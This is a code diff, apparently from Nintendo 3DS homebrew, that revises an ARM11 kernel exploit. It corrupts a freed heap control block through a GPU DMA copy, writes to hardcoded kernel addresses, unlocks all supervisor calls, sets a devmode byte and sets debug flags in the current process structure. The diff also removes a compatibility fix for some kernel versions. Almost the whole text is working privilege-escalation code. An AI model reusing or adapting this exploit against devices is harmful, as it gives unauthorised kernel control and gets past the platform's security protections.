@@ -10,9 +10,6 @@ unsigned int patch_addr;
 unsigned int svc_patch_addr;
 unsigned char patched_svc = 0;
 unsigned int kversion;
-u32 *KProcessPtr;
-u8* devModePtr;
-u32 offs_exheader_flags;
 u8 isN3DS = 0;
 u32 *backup;
 unsigned int *arm11_buffer;
@@ -60,16 +57,10 @@ int arm11_kernel_exploit_setup(void)
 
 	// get proper patch address for our kernel -- thanks yifanlu once again
 	kversion = *(unsigned int *)0x1FF80000; // KERNEL_VERSION register
-	
-	KProcessPtr = 0xFFFF9004;
 	patch_addr = 0;
 	svc_patch_addr = 0;
 	APT_CheckNew3DS(NULL, &isN3DS);
-	
-	//TODO tested on two different kernel versions only
-	offs_exheader_flags = 0xA8;
-	devModePtr = (u8*)0xFFF2D00A;
-	
+
 	if(!isN3DS || kversion < 0x022C0600)
 	{
 	
@@ -117,8 +108,6 @@ int arm11_kernel_exploit_setup(void)
 		{
 			patch_addr = 0xDFF8382F;
 			svc_patch_addr = 0xDFF82260;
-			offs_exheader_flags = 0xB0;
-			devModePtr = (u8*)0xFFF2E00A;
 		}
 		else
 		{
@@ -134,23 +123,19 @@ int arm11_kernel_exploit_setup(void)
 
 	// part 1: corrupt kernel memory
 	u32 tmp_addr;
+
 	unsigned int mem_hax_mem;
-	
 	svcControlMemory(&mem_hax_mem, 0, 0, 0x2000, MEMOP_ALLOC_LINEAR, 0x3);
 	unsigned int mem_hax_mem_free = mem_hax_mem + 0x1000;
 
 	printf("Freeing memory\n");
 	svcControlMemory(&tmp_addr, mem_hax_mem_free, 0, 0x1000, MEMOP_FREE, 0); // free page 
 
-	printf("Backing up heap area:\n");
+	printf("Backing up heap area\n");
 	do_gshax_copy(arm11_buffer, mem_hax_mem_free, 0x20u);
 
 	u32 saved_heap[8];
 	memcpy(saved_heap, arm11_buffer, sizeof(saved_heap));
-
-	printf(" 0: %08X  4: %08X  8: %08X\n12: %08X 16: %08X 20: %08X\n",
-			arm11_buffer[0], arm11_buffer[1], arm11_buffer[2],
-			arm11_buffer[3], arm11_buffer[4], arm11_buffer[5]);			
 
 	arm11_buffer[0] = 1;
 	arm11_buffer[1] = patch_addr;
@@ -166,15 +151,6 @@ int arm11_kernel_exploit_setup(void)
 	//Trigger write to kernel
 	do_gshax_copy(mem_hax_mem_free, arm11_buffer, 0x10u);
 	svcControlMemory(&tmp_addr, mem_hax_mem, 0, 0x1000, MEMOP_FREE, 0);
-
-
-	printf("Heap control block after corruption:\n");
-	do_gshax_copy(arm11_buffer, mem_hax_mem_free, 0x20u);
-
-	printf(" 0: %08X  4: %08X  8: %08X\n12: %08X 16: %08X 20: %08X\n",
-			arm11_buffer[0], arm11_buffer[1], arm11_buffer[2],
-			arm11_buffer[3], arm11_buffer[4], arm11_buffer[5]);
-
 
 #ifdef DEBUG_PROCESS
 	printf("Triggered kernel write\n");
@@ -198,7 +174,6 @@ int arm11_kernel_exploit_setup(void)
 
 	HB_FlushInvalidateCache();
 	nop_func();
-
 
 #ifdef DEBUG_PROCESS
 	printf("Exited nop slide\n");
@@ -224,32 +199,26 @@ arm11_kernel_execute(int (*func)(void))
 			 "bx lr\t\n");
 }
 
+struct KProcess {
+	/* 00 */ char padding1[0xA8 - 0x0];
+	/* A8 */ u32 exheader_flags;
+	/* AC */ char padding2[0xB4 - 0xAC];
+	/* B4 */ u32 pid;
+};
+
 void test(void)
 {
-	arm11_buffer[0] = 0xFAAFFAAF;
+	struct KProcess* kproc = *((struct KProcess**)0xFFFF9004);
+	arm11_buffer[0] = kproc->pid;
 }
 
 arm11_kernel_exec (void)
 {
-	u32 old_cpsr;
-
-	old_cpsr = DisableInterrupts();
-
 	arm11_buffer[0] = 0xF00FF00F;
 
-	// fix CreateThread
-	if(isN3DS && (kversion == 0x022C0600 || kversion == 0x022E0000) && (patch_addr == 0xDFF83837))   
-	{
-		// seg001:FFF03830 BL sub_FFF07B44
-		*(int *)(patch_addr+1) = 0xEB0010C3;
-		// seg001:FFF03834 LDR R1, [SP,#0x10+var_8]    
-		*(int *)(patch_addr+5) = 0xE59D1008;
-		// seg001:FFF03838 ADD SP, SP, #0xC    
-		*(int *)(patch_addr+9) = 0xE28DD00C;         
-	}
-	else
-		*(int *)(patch_addr+8) = 0x8DD00CE5;
-			
+	// fix up memory
+	*(int *)(patch_addr+8) = 0x8DD00CE5;
+
 	// give us access to all SVCs (including 0x7B, so we can return to kernel mode) 
 	if(svc_patch_addr > 0)
 	{
@@ -258,14 +227,10 @@ arm11_kernel_exec (void)
 		patched_svc = 1;
 	}
 
-	// enable "devmode"
-	*(u8*)(devModePtr) |= 1;
+	*((u8*)0xFFF2D00A) |= 1;
 
-	// enable debugging
-	u32 *kproc = *(u32 *)KProcessPtr;	
-	*(u32 *)(kproc+offs_exheader_flags) |= 0x2;
-
-	EnableInterrupts(old_cpsr);
+	struct KProcess* kproc = *((struct KProcess**)0xFFFF9004);
+	kproc->exheader_flags |= 0x2;
 
 	InvalidateEntireInstructionCache();
 	InvalidateEntireDataCache();
@@ -330,9 +295,10 @@ int doARM11Hax()
 		arm11_kernel_exploit_exec (arm11_kernel_stub);
 		if(patched_svc > 0)
 		{
-			// removed call to SVC 7B in order to improve
-			// stability
-			test();
+#ifdef DEBUG_PROCESS
+			printf("Testing SVC 0x7B\n");
+#endif
+			arm11_kernel_execute (test);
 		}
 
 #ifdef DEBUG_PROCESS
